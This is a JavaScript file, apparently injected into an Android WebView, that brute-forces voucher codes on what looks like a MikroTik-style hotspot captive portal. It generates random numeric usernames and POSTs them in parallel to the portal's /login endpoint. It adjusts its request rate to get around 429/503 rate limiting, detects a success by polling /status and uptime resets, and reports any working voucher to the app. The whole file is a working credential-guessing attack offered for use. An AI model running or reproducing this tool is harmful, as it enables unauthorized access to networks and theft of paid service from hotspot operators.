(function() {
    const CFG = window.FINDER_CONFIG;
    const TRIED = new Set((CFG.tried || []).slice());
    const ERRS = [];
    let stopped = false;
    let rtt = 500, parallel = 1;
    let done = 0, errCount = 0, badCount = 0;

    function log(m) { if (window.AndroidBridge) window.AndroidBridge.log(m); }
    function progress(c, t, v) { if (window.AndroidBridge) window.AndroidBridge.progress(c, t, v); }
    function reportFound(v, st) { if (window.AndroidBridge) window.AndroidBridge.found(v, JSON.stringify(st)); }
    function markBad(v) { if (window.AndroidBridge) window.AndroidBridge.markBad(v); }
    function markErr(v) { if (window.AndroidBridge) window.AndroidBridge.markErr(v); }
    window.stopFinder = function() { stopped = true; };

    const sleep = ms => new Promise(r => setTimeout(r, ms));

    async function safeJson(url) {
        try {
            const r = await fetch(url, { credentials: 'include', cache: 'no-cache' });
            const t = await r.text();
            try { return JSON.parse(t); } catch(e) {
                const s = t.indexOf('{'), e2 = t.lastIndexOf('}');
                if (s !== -1 && e2 > s) { try { return JSON.parse(t.substring(s, e2+1)); } catch(_) {} }
                return null;
            }
        } catch(e) { return null; }
    }

    function isActive(st) {
        if (!st) return false;
        const li = String(st.logged_in || '').toLowerCase();
        if (!['yes','true','1','on'].includes(li)) return false;
        const u = String(st.username || '').trim();
        const ip = String(st.ip || '').trim();
        const up = String(st.uptime || '').trim();
        return (u && u !== '-' && u !== 'N/A') || (ip && ip !== '-' && up && up !== '-');
    }
    function statusUser(st) {
        if (!st) return null;
        const u = String(st.username || '').trim();
        return (u && u !== '-' && u !== 'N/A' && u !== '---') ? u : null;
    }
    function uptimeSec(s) {
        if (!s) return -1;
        const m = String(s).trim().match(/^(?:(\d+)d)?(?:(\d+)h)?(?:(\d+)m)?(?:(\d+)s)?$/);
        if (!m) return -1;
        return (parseInt(m[1]||0)*86400) + (parseInt(m[2]||0)*3600) + (parseInt(m[3]||0)*60) + parseInt(m[4]||0);
    }
    async function measureRTT(url, n) {
        const times = [];
        for (let i = 0; i < n; i++) {
            const t0 = performance.now();
            try { await fetch(url, { credentials: 'include', cache: 'no-cache' }); times.push(performance.now() - t0); } catch(e) {}
            await sleep(30);
        }
        return times.length ? times.reduce((a,b)=>a+b,0)/times.length : 500;
    }
    function calcParallel(r) {
        if (r < 50) return 15;
        if (r < 100) return 12;
        if (r < 180) return 8;
        if (r < 300) return 6;
        if (r < 500) return 4;
        if (r < 900) return 3;
        if (r < 1500) return 2;
        return 1;
    }

    async function run() {
        const base = new URL(CFG.url).origin;
        const statusUrl = base + '/status?var=callBack';
        const loginUrl = base + '/login';

        log('▶ بدء: ' + base);
        log('مرشحات سابقة: ' + TRIED.size + ' (تُخطّى)');

        const init = await safeJson(statusUrl);
        if (init && isActive(init)) {
            const u = statusUser(init);
            if (u) { log('✓ كرت مسجل: ' + u); reportFound(u, init); return; }
            log('⚠ جلسة نشطة، username مخفي'); return;
        }

        log('⚡ قياس RTT...');
        rtt = await measureRTT(statusUrl, 3);
        parallel = Math.min(15, calcParallel(rtt));
        log('⚡ RTT=' + Math.round(rtt) + 'ms → توازي=' + parallel);

        let template = { username: '', password: '', dst: base + '/', popup: 'true' };
        try {
            const html = await fetch(CFG.url, { credentials: 'include' }).then(r => r.text());
            const doc = new DOMParser().parseFromString(html, 'text/html');
            const form = doc.querySelector('form');
            if (form) form.querySelectorAll('input').forEach(i => {
                const n = i.getAttribute('name');
                if (n) template[n] = i.getAttribute('value') || '';
            });
        } catch(e) {}

        const maxVal = Math.pow(10, CFG.digits) - 1;
        const beforeUp = init ? uptimeSec(init.uptime) : -1;
        const beforeActive = isActive(init);
        const startTime = performance.now();
        let batchCount = 0, rateLimitHits = 0;

        function gen() {
            for (let k = 0; k < 500; k++) {
                const num = Math.floor(Math.random() * (maxVal + 1));
                const v = CFG.prefix + String(num).padStart(CFG.digits, '0') + CFG.suffix;
                if (!TRIED.has(v)) { TRIED.add(v); return v; }
            }
            return null;
        }

        async function post(v) {
            const body = new URLSearchParams();
            for (const k in template) body.set(k, template[k]);
            body.set('username', v);
            body.set('password', '');
            const t0 = performance.now();
            try {
                const r = await fetch(loginUrl, {
                    method: 'POST', body: body.toString(),
                    credentials: 'include',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    redirect: 'manual'
                });
                const loc = r.headers.get('Location') || '';
                return { v, code: r.status, loc, isFail: /error|fail|invalid|denied/i.test(loc), t: performance.now() - t0 };
            } catch(e) {
                return { v, code: 0, err: e.message, isFail: true, t: performance.now() - t0 };
            }
        }

        while (done < CFG.attempts && !stopped) {
            const batch = [];
            for (let j = 0; j < parallel && done < CFG.attempts; j++) {
                const v = gen();
                if (!v) break;
                done++;
                progress(done, CFG.attempts, v + ' ⚡' + parallel);
                batch.push(post(v));
            }
            if (batch.length === 0) { log('⚠ نفدت الأرقام'); break; }

            const bStart = performance.now();
            const results = await Promise.all(batch);
            const bTime = performance.now() - bStart;
            batchCount++;

            const limited = results.some(r => r.code === 429 || r.code === 503);
            if (limited) {
                rateLimitHits++;
                if (rateLimitHits >= 2) {
                    parallel = Math.max(1, Math.floor(parallel / 2));
                    log('🛑 حظر — خفض التوازي إلى ' + parallel);
                    rateLimitHits = 0;
                }
                await sleep(CFG.retryDelay);
            } else if (rateLimitHits > 0) rateLimitHits--;

            for (const r of results) {
                if (r.code === 429 || r.code === 503) { log('🛑 حظر ' + r.code + ': ' + r.v); continue; }
                if (r.code === 0) { errCount++; markErr(r.v); ERRS.push(r.v); log('⚠ خطأ شبكة: ' + r.v + ' — ' + (r.err || 'unknown')); continue; }
                if (r.code === 404 || r.code === 400) { badCount++; markBad(r.v); continue; }
                if (r.isFail) { badCount++; markBad(r.v); continue; }
            }

            const needCheck = results.some(r =>
                r.code > 0 && r.code !== 429 && r.code !== 503 &&
                r.code !== 404 && r.code !== 400 && !r.isFail);

            if (needCheck) {
                await sleep(20);
                const st = await safeJson(statusUrl);
                const u = statusUser(st);
                if (u) { log('✅ ' + u); reportFound(u, st); return; }
                const up = uptimeSec(st && st.uptime);
                if (st && isActive(st) && beforeUp > 30 && up >= 0 && up <= 15) {
                    const cand = results.find(r => r.code > 0 && r.code !== 429 && r.code !== 503);
                    if (cand) { log('✅ uptime reset: ' + cand.v); reportFound(cand.v, st); return; }
                }
                if (st && isActive(st) && !beforeActive && up >= 0 && up <= 15) {
                    const cand = results.find(r => r.code > 0 && r.code !== 429 && r.code !== 503);
                    if (cand) { log('✅ جلسة: ' + cand.v); reportFound(cand.v, st); return; }
                }
            }

            if (done % CFG.statusEvery < parallel) {
                const st = await safeJson(statusUrl);
                const u = statusUser(st);
                if (u && !TRIED.has(u)) { log('✅ periodic: ' + u); reportFound(u, st); return; }
            }

            if (batchCount % CFG.rttEvery === 0) {
                const perReq = bTime / Math.max(1, batch.length);
                rtt = rtt * 0.7 + perReq * 0.3;
                const np = Math.min(15, calcParallel(rtt));
                if (np !== parallel) { parallel = np; log('⚙ RTT=' + Math.round(rtt) + 'ms → ' + parallel); }
            }

            if (batchCount % 50 === 0) await sleep(CFG.pause);
        }

        if (ERRS.length > 0 && !stopped) {
            log('🔁 إعادة ' + ERRS.length + ' فاشل شبكياً...');
            for (let i = 0; i < ERRS.length && !stopped; i++) {
                const v = ERRS[i];
                const r = await post(v);
                if (r.code > 0 && r.code !== 429 && r.code !== 503) {
                    await sleep(100);
                    const st = await safeJson(statusUrl);
                    if (statusUser(st) === v) { log('✅ محاولة 2: ' + v); reportFound(v, st); return; }
                    if (r.isFail || r.code === 404) markBad(v);
                }
                await sleep(CFG.pause);
            }
        }

        const sec = ((performance.now() - startTime) / 1000).toFixed(1);
        log('❌ انتهى — ' + done + '/' + CFG.attempts + ' في ' + sec + 's (' + Math.round(done/sec) + '/ث)');
        log('   bad=' + badCount + ' err=' + errCount);
    }

    setTimeout(run, 500);
})();
